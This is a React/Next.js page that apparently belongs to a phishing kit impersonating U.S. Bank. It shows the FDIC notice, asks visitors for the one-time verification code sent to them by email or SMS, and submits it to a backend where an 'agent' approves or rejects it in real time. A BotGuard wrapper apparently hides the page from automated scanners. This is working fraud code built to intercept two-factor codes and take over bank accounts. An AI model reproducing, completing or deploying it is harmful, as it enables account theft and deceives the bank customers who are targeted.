'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your secret code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your secret code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Verification Code</h2>
      </section>

      {/* Direct use of login-form without intermediate login-content wrapper */}
      <form className="login-form" onSubmit={handleSubmit}>
        <p className="mb-4 text-[#555]">
          Enter the code you received via email or SMS.
        </p>

        <div className={`form-group ${fieldError ? 'error' : ''}`} style={fieldError ? { marginBottom: '4px' } : {}}>
          <input
            type="text"
            id="secretKey"
            className="input-field"
            placeholder=" "
            value={secretKey}
            onChange={(e) => {
              setSecretKey(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isWaiting}
            autoComplete="off"
          />
          <label htmlFor="secretKey" className="input-label">Secret Code</label>
        </div>

        {/* Error message */}
        {fieldError && (
          <div className="error-message" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{fieldError}</span>
          </div>
        )}

        {status === 'waiting' && !fieldError && (
          <div className="mb-4 text-center">
            <p className="text-[#0c2074] font-medium text-sm animate-pulse">
              Verifying code with secure server...
            </p>
          </div>
        )}

        <button
          type="submit"
          className="btn btn-primary"
          disabled={!secretKey.trim() || isWaiting}
          style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
        >
          {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
          {isWaiting ? 'Processing...' : 'Verify Code'}
        </button>

        {/* Identical link-group structure from page.tsx */}
        <div className="link-group">
          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
            If an agent has provided you with a direct link, please use that link instead.
          </p>
          <p className="text-sm text-center" style={{ marginTop: '10px', color: 'var(--color-text-secondary)' }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </form>
    </BotGuard>
  );
}
